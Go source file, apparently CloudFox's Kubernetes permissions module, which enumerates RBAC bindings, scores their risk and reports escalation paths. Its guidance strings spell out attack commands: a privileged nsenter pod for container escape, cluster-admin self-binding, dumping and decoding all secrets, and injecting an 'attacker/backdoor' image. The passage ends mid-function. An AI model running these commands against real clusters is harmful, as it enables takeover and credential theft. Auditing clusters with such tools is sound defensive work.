package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	v1 "k8s.io/api/rbac/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"sigs.k8s.io/yaml"
)

var PermissionsCmd = &cobra.Command{
	Use:     "permissions",
	Aliases: []string{"perms"},
	Short:   "List all cluster RBAC permissions with comprehensive security analysis",
	Long: `
List all cluster RBAC permissions with detailed security analysis including:
- Privilege escalation path detection (15+ patterns)
- Dangerous permission pattern identification
- Service account security analysis
- RBAC misconfiguration detection
- Complete attack path visualization

Usage:
  cloudfox kubernetes permissions`,
	Run: RunEnumPermissions,
}

type PermsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PermsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t PermsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

// PermissionFinding represents comprehensive security analysis for a permission
type PermissionFinding struct {
	// Basic info
	ResourceType     string // RoleBinding, ClusterRoleBinding
	Namespace        string
	SubjectKind      string // User, Group, ServiceAccount
	SubjectName      string
	SubjectNamespace string
	Role             string
	ClusterRole      string

	// Permission details
	Verb          string
	Resource      string
	ResourceNames []string // Specific resource name restrictions
	APIGroup      string
	Scope         string // cluster, namespace

	// Security analysis
	RiskLevel             string // CRITICAL/HIGH/MEDIUM/LOW
	SecurityIssues        []string
	DangerousPermissions  []string
	MisconfigurationTypes []string

	// Privilege escalation detection
	AllowsPrivilegeEscalation bool
	EscalationPaths           []string
	EscalationRisk            string // CRITICAL/HIGH/MEDIUM/LOW/NONE

	// Dangerous permission categories
	AllowsClusterAdmin       bool
	AllowsCreatePods         bool
	AllowsExecPods           bool
	AllowsCreateSecrets      bool
	AllowsReadSecrets        bool
	AllowsCreateRoleBindings bool
	AllowsImpersonate        bool
	AllowsWildcardResources  bool
	AllowsWildcardVerbs      bool

	// Container escape risks
	AllowsHostPath       bool
	AllowsPrivilegedPods bool
	AllowsHostNetwork    bool
	AllowsNodeAccess     bool
	ContainerEscapeRisk  string

	// Resource scope analysis
	HasResourceNameRestriction bool
	IsWildcardRole             bool

	// Service account specific
	IsServiceAccount      bool
	AutomountServiceToken bool
	BoundToWorkloads      bool
	WorkloadCount         int

	// Attack scenarios
	AllowsClusterTakeover  bool
	AllowsDataExfiltration bool
	AllowsLateralMovement  bool
	AttackPaths            []string
}

// EscalationPath represents a privilege escalation chain
type EscalationPath struct {
	Subject         string
	StartPermission string
	Steps           []string
	EndResult       string
	RiskLevel       string
}

// PermissionPattern represents a dangerous permission pattern
type PermissionPattern struct {
	Name            string
	Description     string
	Severity        string
	ExploitGuidance string
	Check           func(p PermissionFinding) bool
}

// ServiceAccountAnalysis tracks service account security
type ServiceAccountAnalysis struct {
	Name                     string
	Namespace                string
	AutomountToken           bool
	BoundPods                []string
	BoundPodCount            int
	Permissions              []PermissionFinding
	RiskLevel                string
	SecurityIssues           []string
	IsOverPrivileged         bool
	IsDefault                bool
	IsUnused                 bool
	HasClusterAccess         bool
	HasSecretsAccess         bool
	HasPodCreateAccess       bool
	PrivilegeEscalationPaths []string
}

// Dangerous permission patterns database
var dangerousPermissionPatterns = []PermissionPattern{
	{
		Name:            "Cluster Admin",
		Description:     "Full cluster administrative access",
		Severity:        "CRITICAL",
		ExploitGuidance: "This role grants unrestricted access to all cluster resources. Can read all secrets, create/delete any resource, and fully compromise the cluster.",
		Check: func(p PermissionFinding) bool {
			return p.ClusterRole == "cluster-admin" || p.Role == "cluster-admin"
		},
	},
	{
		Name:            "Wildcard Resources",
		Description:     "Access to all resource types (*)",
		Severity:        "CRITICAL",
		ExploitGuidance: "Can perform actions on ANY resource type in the cluster. Equivalent to cluster-admin when combined with wildcard verbs.",
		Check: func(p PermissionFinding) bool {
			return p.Resource == "*"
		},
	},
	{
		Name:            "Wildcard Verbs",
		Description:     "All verbs allowed (*)",
		Severity:        "CRITICAL",
		ExploitGuidance: "Can perform ANY action (get, list, create, update, delete, etc.) on resources. Extremely dangerous when combined with broad resource access.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "*"
		},
	},
	{
		Name:            "Create Pods",
		Description:     "Can create pods without restrictions",
		Severity:        "CRITICAL",
		ExploitGuidance: "Create privileged pod with hostPath:/ → container escape → node root → etcd access → cluster takeover",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "pods" && len(p.ResourceNames) == 0
		},
	},
	{
		Name:            "Create ClusterRoleBindings",
		Description:     "Can grant cluster-wide permissions",
		Severity:        "CRITICAL",
		ExploitGuidance: "kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --user=<self> → instant cluster-admin",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "clusterrolebindings"
		},
	},
	{
		Name:            "Create RoleBindings",
		Description:     "Can grant namespace permissions",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl create rolebinding escalate --clusterrole=admin --serviceaccount=<namespace>:<self> -n <namespace>",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "rolebindings"
		},
	},
	{
		Name:            "Escalate Verb",
		Description:     "Can bypass RBAC restrictions when creating roles",
		Severity:        "CRITICAL",
		ExploitGuidance: "Special verb allowing creation of roles/rolebindings with permissions the user doesn't have. Bypasses normal RBAC escalation prevention.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "escalate"
		},
	},
	{
		Name:            "Bind Verb",
		Description:     "Can bind roles without having their permissions",
		Severity:        "CRITICAL",
		ExploitGuidance: "Can create RoleBindings to powerful roles (like cluster-admin) without owning those permissions first. Direct path to privilege escalation.",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "bind"
		},
	},
	{
		Name:            "Impersonate Users",
		Description:     "Can act as other users or service accounts",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl get secrets -A --as=admin --as-group=system:masters → steal credentials → lateral movement",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "impersonate"
		},
	},
	{
		Name:            "Get/List Secrets (Cluster)",
		Description:     "Can read all secrets cluster-wide",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl get secrets -A -o json | jq '.items[].data | map_values(@base64d)' → database passwords, API keys, tokens",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "get" || p.Verb == "list") && p.Resource == "secrets" && p.Scope == "cluster"
		},
	},
	{
		Name:            "Get/List Secrets (Namespace)",
		Description:     "Can read secrets in namespace",
		Severity:        "MEDIUM",
		ExploitGuidance: "kubectl get secrets -n <namespace> -o json | jq '.items[].data | map_values(@base64d)'",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "get" || p.Verb == "list") && p.Resource == "secrets" && p.Scope == "namespace"
		},
	},
	{
		Name:            "Exec Into Pods",
		Description:     "Can execute commands in running containers",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl exec -it <pod> -n <namespace> -- /bin/sh → RCE in container → steal mounted secrets → lateral movement",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "pods/exec"
		},
	},
	{
		Name:            "Delete Namespaces",
		Description:     "Can destroy entire namespaces",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl delete namespace <target> → destroys all resources, persistent volumes, and data in namespace",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "delete" && p.Resource == "namespaces"
		},
	},
	{
		Name:            "Create Nodes",
		Description:     "Can add malicious nodes to cluster",
		Severity:        "HIGH",
		ExploitGuidance: "Register rogue node → drain legitimate workloads to malicious node → steal secrets and data",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "nodes"
		},
	},
	{
		Name:            "Patch/Update Deployments",
		Description:     "Can modify deployments for backdoor injection",
		Severity:        "HIGH",
		ExploitGuidance: "kubectl patch deployment <target> --patch '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"backdoor\",\"image\":\"malicious\"}]}}}}' → persistent backdoor",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "patch" || p.Verb == "update") && p.Resource == "deployments"
		},
	},
	{
		Name:            "Patch/Update DaemonSets",
		Description:     "Can modify DaemonSets for node-wide persistence",
		Severity:        "HIGH",
		ExploitGuidance: "Inject malicious container into DaemonSet → runs on every node in cluster → cluster-wide persistence",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "patch" || p.Verb == "update") && p.Resource == "daemonsets"
		},
	},
	{
		Name:            "Create PersistentVolumes",
		Description:     "Can create hostPath PVs for host filesystem access",
		Severity:        "HIGH",
		ExploitGuidance: "Create hostPath PV pointing to / → create PVC → mount in pod → read /etc/shadow, SSH keys, kubeconfig",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "persistentvolumes"
		},
	},
	{
		Name:            "Proxy to Services",
		Description:     "Can proxy to cluster services",
		Severity:        "MEDIUM",
		ExploitGuidance: "kubectl proxy → access internal services from external network → bypass NetworkPolicies",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "services/proxy"
		},
	},
	{
		Name:            "Update ConfigMaps",
		Description:     "Can modify application configurations",
		Severity:        "MEDIUM",
		ExploitGuidance: "Modify ConfigMap → inject malicious config (e.g., redirect logs, change endpoints) → wait for pod restart",
		Check: func(p PermissionFinding) bool {
			return (p.Verb == "update" || p.Verb == "patch") && p.Resource == "configmaps"
		},
	},
	{
		Name:            "Create PodSecurityPolicies",
		Description:     "Can create permissive PSPs",
		Severity:        "HIGH",
		ExploitGuidance: "Create PSP allowing privileged pods, hostPath, hostNetwork → use to bypass pod security restrictions",
		Check: func(p PermissionFinding) bool {
			return p.Verb == "create" && p.Resource == "podsecuritypolicies"
		},
	},
}

func RunEnumPermissions(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()
	parentCmd := cmd.Parent()

	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating RBAC permissions for %s with comprehensive security analysis", globals.ClusterName), globals.K8S_PERMISSIONS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Fetch all required resources
	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_PERMISSIONS_MODULE_NAME)
		return
	}

	clusterRoles, err := clientset.RbacV1().ClusterRoles().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing cluster roles: %v", err), globals.K8S_PERMISSIONS_MODULE_NAME)
		return
	}

	clusterRoleBindings, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing cluster role bindings: %v", err), globals.K8S_PERMISSIONS_MODULE_NAME)
		return
	}

	// Build permission findings with security analysis
	var findings []PermissionFinding

	// Process ClusterRoleBindings
	for _, crb := range clusterRoleBindings.Items {
		if len(crb.Subjects) == 0 {
			continue
		}

		// Find the referenced ClusterRole
		var clusterRole *v1.ClusterRole
		for i := range clusterRoles.Items {
			if clusterRoles.Items[i].Name == crb.RoleRef.Name {
				clusterRole = &clusterRoles.Items[i]
				break
			}
		}

		if clusterRole == nil {
			continue
		}

		// Process each rule in the ClusterRole
		for _, rule := range clusterRole.Rules {
			perms := explodeRule(rule)
			for _, perm := range perms {
				for _, subj := range crb.Subjects {
					subjNamespace := subj.Namespace
					if subjNamespace == "" {
						subjNamespace = "<cluster>"
					}

					finding := PermissionFinding{
						ResourceType:     "ClusterRoleBinding",
						Namespace:        subjNamespace,
						SubjectKind:      subj.Kind,
						SubjectName:      subj.Name,
						SubjectNamespace: subj.Namespace,
						ClusterRole:      crb.RoleRef.Name,
						Verb:             perm.Verb,
						Resource:         perm.Resource,
						ResourceNames:    rule.ResourceNames,
						APIGroup:         perm.APIGroup,
						Scope:            "cluster",
					}

					// Perform security analysis
					analyzePermissionSecurity(&finding)

					findings = append(findings, finding)
				}
			}
		}
	}

	// Process Roles and RoleBindings namespace by namespace
	for _, ns := range namespaces.Items {
		roles, err := clientset.RbacV1().Roles(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing Roles in namespace %s: %v", ns.Name, err), globals.K8S_PERMISSIONS_MODULE_NAME)
			continue
		}

		rbs, err := clientset.RbacV1().RoleBindings(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing RoleBindings in namespace %s: %v", ns.Name, err), globals.K8S_PERMISSIONS_MODULE_NAME)
			continue
		}

		for _, rb := range rbs.Items {
			if len(rb.Subjects) == 0 {
				continue
			}

			// Find the referenced Role
			var role *v1.Role
			for i := range roles.Items {
				if roles.Items[i].Name == rb.RoleRef.Name {
					role = &roles.Items[i]
					break
				}
			}

			if role == nil {
				continue
			}

			// Process each rule in the Role
			for _, rule := range role.Rules {
				perms := explodeRule(rule)
				for _, perm := range perms {
					for _, subj := range rb.Subjects {
						subjNamespace := subj.Namespace
						if subjNamespace == "" {
							subjNamespace = "<NONE>"
						}

						finding := PermissionFinding{
							ResourceType:     "RoleBinding",
							Namespace:        ns.Name,
							SubjectKind:      subj.Kind,
							SubjectName:      subj.Name,
							SubjectNamespace: subjNamespace,
							Role:             rb.RoleRef.Name,
							Verb:             perm.Verb,
							Resource:         perm.Resource,
							ResourceNames:    rule.ResourceNames,
							APIGroup:         perm.APIGroup,
							Scope:            "namespace",
						}

						// Perform security analysis
						analyzePermissionSecurity(&finding)

						findings = append(findings, finding)
					}
				}
			}
		}
	}

	// Detect privilege escalation paths
	escalationPaths := detectPrivilegeEscalationPaths(findings)

	// Analyze service accounts
	saAnalyses := analyzeServiceAccounts(ctx, clientset, findings)

	// Detect RBAC misconfigurations
	misconfigurations := detectRBACMisconfigurations(ctx, clientset, findings, clusterRoles.Items, clusterRoleBindings.Items)

	// Generate outputs
	tableFile := generatePermissionsTable(findings)
	lootFiles := generatePermissionsLootFiles(findings, escalationPaths, saAnalyses, misconfigurations)

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Permissions",
		globals.ClusterName,
		"results",
		PermsOutput{
			Table: []internal.TableFile{tableFile},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PERMISSIONS_MODULE_NAME)
		return
	}

	// Summary statistics
	criticalCount := 0
	highCount := 0
	escalationCount := len(escalationPaths)
	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" {
			criticalCount++
		} else if f.RiskLevel == "HIGH" {
			highCount++
		}
	}

	if len(findings) > 0 {
		logger.InfoM(fmt.Sprintf("%d permissions found (%d CRITICAL, %d HIGH risk, %d escalation paths)", len(findings), criticalCount, highCount, escalationCount), globals.K8S_PERMISSIONS_MODULE_NAME)
	} else {
		logger.InfoM("No permissions found, skipping output file creation", globals.K8S_PERMISSIONS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PERMISSIONS_MODULE_NAME), globals.K8S_PERMISSIONS_MODULE_NAME)
}

// analyzePermissionSecurity performs comprehensive security analysis on a permission
func analyzePermissionSecurity(finding *PermissionFinding) {
	// Check if service account
	finding.IsServiceAccount = (finding.SubjectKind == "ServiceAccount")

	// Check for resource name restrictions
	finding.HasResourceNameRestriction = len(finding.ResourceNames) > 0

	// Detect dangerous permission categories
	if finding.Resource == "*" {
		finding.AllowsWildcardResources = true
	}
	if finding.Verb == "*" {
		finding.AllowsWildcardVerbs = true
	}
	if finding.Verb == "create" && finding.Resource == "pods" {
		finding.AllowsCreatePods = true
	}
	if finding.Verb == "create" && finding.Resource == "pods/exec" {
		finding.AllowsExecPods = true
	}
	if finding.Verb == "create" && finding.Resource == "secrets" {
		finding.AllowsCreateSecrets = true
	}
	if (finding.Verb == "get" || finding.Verb == "list" || finding.Verb == "*") && finding.Resource == "secrets" {
		finding.AllowsReadSecrets = true
	}
	if finding.Verb == "create" && (finding.Resource == "rolebindings" || finding.Resource == "clusterrolebindings") {
		finding.AllowsCreateRoleBindings = true
	}
	if finding.Verb == "impersonate" {
		finding.AllowsImpersonate = true
	}
	if finding.ClusterRole == "cluster-admin" || finding.Role == "cluster-admin" {
		finding.AllowsClusterAdmin = true
	}

	// Container escape risks
	if finding.AllowsCreatePods {
		finding.AllowsHostPath = true
		finding.AllowsPrivilegedPods = true
		finding.AllowsHostNetwork = true
		finding.ContainerEscapeRisk = "CRITICAL"
	}

	// Attack scenarios
	if finding.AllowsClusterAdmin || (finding.AllowsWildcardResources && finding.AllowsWildcardVerbs) {
		finding.AllowsClusterTakeover = true
	}
	if finding.AllowsReadSecrets {
		finding.AllowsDataExfiltration = true
	}
	if finding.AllowsImpersonate || finding.AllowsExecPods {
		finding.AllowsLateralMovement = true
	}

	// Check against dangerous patterns
	for _, pattern := range dangerousPermissionPatterns {
		if pattern.Check(*finding) {
			finding.DangerousPermissions = append(finding.DangerousPermissions, pattern.Name)
			finding.SecurityIssues = append(finding.SecurityIssues,
				fmt.Sprintf("%s: %s", pattern.Name, pattern.Description))
		}
	}

	// Privilege escalation detection
	if finding.AllowsCreateRoleBindings {
		finding.AllowsPrivilegeEscalation = true
		finding.EscalationRisk = "CRITICAL"
		finding.EscalationPaths = append(finding.EscalationPaths,
			"Create RoleBinding to cluster-admin → instant privilege escalation")
	}
	if finding.Verb == "escalate" || finding.Verb == "bind" {
		finding.AllowsPrivilegeEscalation = true
		finding.EscalationRisk = "CRITICAL"
	}
	if finding.AllowsCreatePods {
		finding.AllowsPrivilegeEscalation = true
		if finding.EscalationRisk != "CRITICAL" {
			finding.EscalationRisk = "HIGH"
		}
		finding.EscalationPaths = append(finding.EscalationPaths,
			"Create privileged pod → container escape → node root → cluster takeover")
	}

	// Calculate overall risk level
	finding.RiskLevel = calculatePermissionRiskLevel(*finding)
}

// calculatePermissionRiskLevel determines overall risk level
func calculatePermissionRiskLevel(finding PermissionFinding) string {
	riskScore := 0

	// CRITICAL FACTORS (50+ points)
	if finding.AllowsClusterAdmin {
		riskScore += 100
	}
	if finding.AllowsCreateRoleBindings && finding.Scope == "cluster" {
		riskScore += 90
	}
	if finding.AllowsWildcardResources && finding.AllowsWildcardVerbs {
		riskScore += 85
	}
	if finding.Verb == "escalate" || finding.Verb == "bind" {
		riskScore += 80
	}
	if finding.AllowsCreatePods && !finding.HasResourceNameRestriction {
		riskScore += 75
	}

	// HIGH FACTORS (25-40 points)
	if finding.AllowsExecPods {
		riskScore += 40
	}
	if finding.AllowsReadSecrets && finding.Scope == "cluster" {
		riskScore += 35
	}
	if finding.AllowsImpersonate {
		riskScore += 30
	}
	if finding.Verb == "delete" && finding.Resource == "namespaces" {
		riskScore += 30
	}
	if finding.Verb == "create" && finding.Resource == "nodes" {
		riskScore += 28
	}
	if (finding.Verb == "patch" || finding.Verb == "update") && finding.Resource == "daemonsets" {
		riskScore += 27
	}
	if finding.Verb == "create" && finding.Resource == "persistentvolumes" {
		riskScore += 26
	}

	// MEDIUM FACTORS (10-20 points)
	if finding.AllowsReadSecrets && finding.Scope == "namespace" {
		riskScore += 20
	}
	if finding.AllowsCreateRoleBindings && finding.Scope == "namespace" {
		riskScore += 18
	}
	if (finding.Verb == "patch" || finding.Verb == "update") && finding.Resource == "deployments" {
		riskScore += 15
	}
	if (finding.Verb == "update" || finding.Verb == "patch") && finding.Resource == "configmaps" {
		riskScore += 12
	}

	// Resource name restriction reduces risk
	if finding.HasResourceNameRestriction {
		riskScore -= 10
	}

	// Classify
	if riskScore >= 50 {
		return "CRITICAL"
	} else if riskScore >= 25 {
		return "HIGH"
	} else if riskScore >= 10 {
		return "MEDIUM"
	}
	return "LOW"
}

// detectPrivilegeEscalationPaths identifies privilege escalation chains
func detectPrivilegeEscalationPaths(permissions []PermissionFinding) []EscalationPath {
	var paths []EscalationPath

	// Group permissions by subject
	subjectPerms := make(map[string][]PermissionFinding)
	for _, p := range permissions {
		key := fmt.Sprintf("%s/%s/%s", p.SubjectKind, p.SubjectNamespace, p.SubjectName)
		subjectPerms[key] = append(subjectPerms[key], p)
	}

	for subject, perms := range subjectPerms {
		// Path 1: create clusterrolebindings = instant cluster-admin
		if hasPermission(perms, "create", "clusterrolebindings") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create clusterrolebindings",
				Steps: []string{
					"kubectl create clusterrolebinding escalate --clusterrole=cluster-admin --user=<self>",
					"Gain full cluster-admin privileges",
					"Access all secrets, pods, nodes",
					"Complete cluster takeover",
				},
				EndResult: "Cluster-admin privileges",
				RiskLevel: "CRITICAL",
			})
		}

		// Path 2: create pods = container escape
		if hasPermission(perms, "create", "pods") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create pods",
				Steps: []string{
					"Create privileged pod with hostPath: /",
					"kubectl run escape --image=alpine --restart=Never --overrides='{\"spec\":{\"hostNetwork\":true,\"hostPID\":true,\"containers\":[{\"name\":\"escape\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"-t\",\"1\",\"-m\",\"-u\",\"-n\",\"-i\",\"sh\"],\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]}}'",
					"Exec into pod: kubectl exec -it escape -- sh",
					"Access host filesystem at /host",
					"Read /host/etc/shadow, /host/root/.kube/config",
					"Access etcd secrets: cat /host/var/lib/etcd/*",
					"Become cluster-admin",
				},
				EndResult: "Full cluster compromise via container escape",
				RiskLevel: "CRITICAL",
			})
		}

		// Path 3: get secrets + create pods = credential theft
		if hasPermission(perms, "get", "secrets") && hasPermission(perms, "create", "pods") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "get secrets + create pods",
				Steps: []string{
					"kubectl get secrets -A -o json > all-secrets.json",
					"Extract database credentials, API keys, service account tokens",
					"Create pod with stolen credentials",
					"Use credentials for lateral movement",
					"Escalate via compromised high-privilege service accounts",
				},
				EndResult: "Data exfiltration and lateral movement",
				RiskLevel: "HIGH",
			})
		}

		// Path 4: impersonate + exec = lateral movement
		if hasPermission(perms, "impersonate", "users") && hasPermission(perms, "create", "pods/exec") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "impersonate users + exec pods",
				Steps: []string{
					"kubectl get pods -A --as=admin",
					"kubectl exec -it <privileged-pod> --as=admin -- sh",
					"Steal service account token from pod",
					"Use token to escalate privileges",
				},
				EndResult: "Lateral movement via impersonation",
				RiskLevel: "HIGH",
			})
		}

		// Path 5: patch deployments = persistent backdoor
		if hasPermission(perms, "patch", "deployments") || hasPermission(perms, "update", "deployments") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "patch/update deployments",
				Steps: []string{
					"Identify target deployment with elevated privileges",
					"kubectl patch deployment <target> --patch '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"backdoor\",\"image\":\"attacker/backdoor\",\"securityContext\":{\"privileged\":true}}]}}}}'",
					"Wait for deployment rollout",
					"Exec into backdoor container",
					"Container escape to node",
					"Persistent access via deployment",
				},
				EndResult: "Persistent backdoor via deployment modification",
				RiskLevel: "HIGH",
			})
		}

		// Path 6: create persistentvolumes = host filesystem access
		if hasPermission(perms, "create", "persistentvolumes") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "create persistentvolumes",
				Steps: []string{
					"Create PV with hostPath pointing to /",
					"Create PVC binding to the PV",
					"Create pod mounting the PVC",
					"Access entire host filesystem",
					"Read /etc/shadow, SSH keys, kubeconfig",
					"Exfiltrate sensitive data",
				},
				EndResult: "Host filesystem access and data exfiltration",
				RiskLevel: "HIGH",
			})
		}

		// Path 7: escalate/bind verbs = RBAC bypass
		if hasPermission(perms, "escalate", "") || hasPermission(perms, "bind", "") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "escalate or bind verb",
				Steps: []string{
					"Create RoleBinding to cluster-admin without restrictions",
					"Bypass normal RBAC escalation prevention",
					"Gain cluster-admin privileges",
				},
				EndResult: "RBAC restriction bypass → cluster-admin",
				RiskLevel: "CRITICAL",
			})
		}

		// Path 8: patch daemonsets = node-wide persistence
		if hasPermission(perms, "patch", "daemonsets") || hasPermission(perms, "update", "daemonsets") {
			paths = append(paths, EscalationPath{
				Subject:         subject,
				StartPermission: "patch/update daemonsets",
				Steps: []string{
					"Identify DaemonSet running on all nodes",
					"Inject malicious container into DaemonSet",
					"Malicious container runs on every node",
					"Cluster-wide persistence and control",
				},
				EndResult: "Cluster-wide persistence via DaemonSet",
				RiskLevel: "HIGH",
			})
		}
	}

	return paths
}

// analyzeServiceAccounts performs service account security analysis
func analyzeServiceAccounts(ctx context.Context, clientset *kubernetes.Clientset, permissions []PermissionFinding) []ServiceAccountAnalysis {
	var analyses []ServiceAccountAnalysis

	namespaces, _ := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})

	for _, ns := range namespaces.Items {
		sas, err := clientset.CoreV1().ServiceAccounts(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		pods, _ := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})

		for _, sa := range sas.Items {
			analysis := ServiceAccountAnalysis{
				Name:           sa.Name,
				Namespace:      ns.Name,
				AutomountToken: true, // default
			}

			// Check automountServiceAccountToken
			if sa.AutomountServiceAccountToken != nil {
				analysis.AutomountToken = *sa.AutomountServiceAccountToken
			}

			// Find pods using this SA
			for _, pod := range pods.Items {
				if pod.Spec.ServiceAccountName == sa.Name {
					analysis.BoundPods = append(analysis.BoundPods,
						fmt.Sprintf("%s/%s", pod.Namespace, pod.Name))
				}
			}
			analysis.BoundPodCount = len(analysis.BoundPods)

			// Get permissions for this SA
			for _, p := range permissions {
				if p.SubjectKind == "ServiceAccount" &&
					p.SubjectName == sa.Name &&
					(p.SubjectNamespace == ns.Name || p.SubjectNamespace == "<cluster>") {
					analysis.Permissions = append(analysis.Permissions, p)
				}
			}

			// Security analysis
			analysis.IsDefault = (sa.Name == "default")
			analysis.IsUnused = (analysis.BoundPodCount == 0)

			// Check for dangerous permissions
			for _, p := range analysis.Permissions {
				if p.Resource == "secrets" && (p.Verb == "get" || p.Verb == "list" || p.Verb == "*") {
					analysis.HasSecretsAccess = true
				}
				if p.Resource == "pods" && p.Verb == "create" {
					analysis.HasPodCreateAccess = true
				}
				if p.Scope == "cluster" {
					analysis.HasClusterAccess = true
				}
				if p.AllowsPrivilegeEscalation {
					analysis.PrivilegeEscalationPaths = append(analysis.PrivilegeEscalationPaths, p.EscalationPaths...)
				}
			}

			// Risk assessment
			analysis.RiskLevel = "LOW"

			if analysis.IsDefault && analysis.BoundPodCount > 0 && len(analysis.Permissions) > 0 {
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Using default service account with permissions - should use dedicated SA")
				analysis.RiskLevel = "MEDIUM"
			}

			if analysis.AutomountToken && analysis.BoundPodCount > 0 && analysis.HasSecretsAccess {
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Token auto-mounted in pods with secrets access - credential theft risk")
				analysis.RiskLevel = "HIGH"
			}

			if analysis.HasPodCreateAccess {
				analysis.IsOverPrivileged = true
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Can create pods - privilege escalation via container escape")
				analysis.RiskLevel = "HIGH"
			}

			if len(analysis.PrivilegeEscalationPaths) > 0 {
				analysis.IsOverPrivileged = true
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					fmt.Sprintf("Has %d privilege escalation paths", len(analysis.PrivilegeEscalationPaths)))
				analysis.RiskLevel = "CRITICAL"
			}

			if analysis.HasClusterAccess && analysis.BoundPodCount > 0 {
				analysis.SecurityIssues = append(analysis.SecurityIssues,
					"Has cluster-wide permissions - excessive scope")
				if analysis.RiskLevel == "LOW" {
					analysis.RiskLevel = "MEDIUM"
				}
			}

			analyses = append(analyses, analysis)
		}
	}

	return analyses
}

// detectRBACMisconfigurations identifies RBAC configuration issues
func detectRBACMisconfigurations(ctx context.Context, clientset *kubernetes.Clientset,
	permissions []PermissionFinding, clusterRoles []v1.ClusterRole, clusterRoleBindings []v1.ClusterRoleBinding) []string {
	var misconfigurations []string

	// Check for unused ClusterRoles
	usedRoles := make(map[string]bool)
	for _, crb := range clusterRoleBindings {
		usedRoles[crb.RoleRef.Name] = true
	}

	namespaces, _ := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	for _, ns := range namespaces.Items {
		rbs, _ := clientset.RbacV1().RoleBindings(ns.Name).List(ctx, metav1.ListOptions{})
		for _, rb := range rbs.Items {
			if rb.RoleRef.Kind == "ClusterRole" {
				usedRoles[rb.RoleRef.Name] = true
			}
		}
	}

	unusedCount := 0
	for _, cr := range clusterRoles {
		if !usedRoles[cr.Name] && !strings.HasPrefix(cr.Name, "system:") {
			unusedCount++
		}
	}
	if unusedCount > 0 {
		misconfigurations = append(misconfigurations,
			fmt.Sprintf("Found %d unused ClusterRoles (not referenced by any bindings)", unusedCount))
	}

	// Check for RoleBindings with no subjects
	emptyBindings := 0
